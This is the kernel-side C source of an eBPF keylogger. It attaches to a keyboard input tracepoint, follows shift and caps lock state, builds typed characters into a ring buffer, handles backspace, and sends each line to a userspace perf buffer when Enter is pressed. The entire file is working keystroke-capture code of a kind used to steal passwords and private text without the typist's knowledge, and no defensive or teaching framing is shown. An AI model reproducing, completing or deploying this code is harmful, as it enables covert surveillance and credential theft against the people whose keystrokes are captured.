// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "keylogger.h"


// ****************************************
// Methodo
// ****************************************

/*
 *
 */

// ****************************************
// Data structures
// ****************************************

// Map to store the key state and buffer
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(struct key_data));
    __uint(max_entries, 1);
} key_data_map SEC(".maps");

// The perf buffer to send notifs to userspace
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
} perf_map SEC(".maps");


// ****************************************
// Helpers
// ****************************************

// function to add a char to the buffer
static inline void add_char(struct key_data *data, char c)
{
    data->buffer[data->pos] = c;    // add the char to the buffer
    // update the position and size of the buffer
    data->pos = (data->pos + 1) % BUFFER_SIZE;
    if (data->size < BUFFER_SIZE) {
        data->size++;
    }
}

// function to remove the last char from the buffer
static inline void remove_last_char(struct key_data *data)
{
    if (data->size > 0) {
        data->size--;
        if (data->pos == 0)
            data->pos = BUFFER_SIZE - 1;  // to wrap aroundthe buffer
        else
            data->pos--;
    }
}

// function to clear the buffer
static inline void clear_buffer(struct key_data *data)
{
    data->size = 0;
    data->pos = 0;
}

// function to convert keycode to char
// @ https://github.com/torvalds/linux/blob/v6.8/include/uapi/linux/input-event-codes.h
static inline char keycode_to_char(unsigned int code, bool shift_pressed, bool capslock_on)
{
    // ==============================
    // Alphabetic characters (a-z)
    // ==============================
    // organizd by keyboard layers
    // to find corresponding letter from the code:
    //  1. get string representation of the keyboard layer as the `base`
    //  2. get the elem at position `code - <layer_start>`
    //  3. check if shift or capslock is pressed
    //      3.1. if (uppercase), substract 32 (ASCII: diff |b| lowercase letter and uppercase equivalent is 32)
    //  4. return the corresponding char
    if (code >= 16 && code <= 25) {  // q-p
        char base = "qwertyuiop"[code - 16];
        if ((shift_pressed && !capslock_on) || (!shift_pressed && capslock_on))
        return base - 32;  // Convert to uppercase
        return base;
    }
    else if (code >= 30 && code <= 38) {  // a-l
        char base = "asdfghjkl"[code - 30];
        if ((shift_pressed && !capslock_on) || (!shift_pressed && capslock_on))
            return base - 32;  // Convert to uppercase
            return base;
        }
        else if (code >= 44 && code <= 50) {  // z-m
            char base = "zxcvbnm"[code - 44];
        if ((shift_pressed && !capslock_on) || (!shift_pressed && capslock_on))
            return base - 32;  // Convert to uppercase
        return base;
    }

    // ==============================
    // Numeric keys (0-9)
    // ==============================
    else if (code >= 2 && code <= 11) {
        if (code == 11)  // KEY_0
        return '0';
        else
        return '0' + (code - 1);  // KEY_1(2) through KEY_9(10)
    }

    // ==============================
    // Special chars
    // ==============================
    else if (code == 57) {// Space
        return ' ';
    }
    else if (code == 51) { // Comma
        return ',';
    }
    else if (code == 52) { // Dot
        return '.';
    }
    else if (code == 53) { // Hyphen (called KEY_SLASH)
        return '-';
    }
    else if (code == 13) { // Equal
        return '=';
    }

    // ==============================
    // null for other keys
    // ==============================
    return '\0';
}


// ****************************************
// Hook
// ****************************************

SEC("tracepoint/input/input_keyboard_event")
int trace_keyboard_event(struct trace_event_raw_input_keyboard_event *ctx)
{
    // only interested in KEY_PRESS and KEY_RELEASE events (defined `keylogger.h`)
    if (ctx->value != KEY_PRESS && ctx->value != KEY_RELEASE)
        return 0;

    unsigned int code = ctx->code;
    __u32 key = 0;
    struct key_data *data = bpf_map_lookup_elem(&key_data_map, &key);
    if (!data)
        return 0;

    // Handle key release events
    if (ctx->value == KEY_RELEASE) {
        if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
            data->shift_pressed = false;
        }
        return 0;
    }

    // Handle key press events
    switch (code) {
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            data->shift_pressed = true;
            break;

        case KEY_CAPSLOCK:
            data->capslock_on = !data->capslock_on;
            break;

        case KEY_BACKSPACE:
            remove_last_char(data);
            break;

        case KEY_TAB:
            clear_buffer(data);
            break;

        case KEY_ENTER: {
            // Send buffer content via perf event
            struct output_data output;
            __builtin_memset(&output, 0, sizeof(output));

            // Copy the buffer content in correct order
            unsigned int start_pos = 0;
            if (data->size == BUFFER_SIZE) {
                start_pos = data->pos;  // Start from oldest character
            }

            for (unsigned int i = 0; i < data->size; i++) {
                unsigned int idx = (start_pos + i) % BUFFER_SIZE;
                output.buffer[i] = data->buffer[idx];
            }

            // Send to user space
            bpf_perf_event_output(ctx, &perf_map, BPF_F_CURRENT_CPU, &output, sizeof(output));
            break;
        }

        default: {
            char c = keycode_to_char(code, data->shift_pressed, data->capslock_on);
            if (c != '\0') {
                add_char(data, c);
            }
            break;
        }
    }

    return 0;
}

char LICENSE[] SEC("license") = "Dual BSD/GPL";
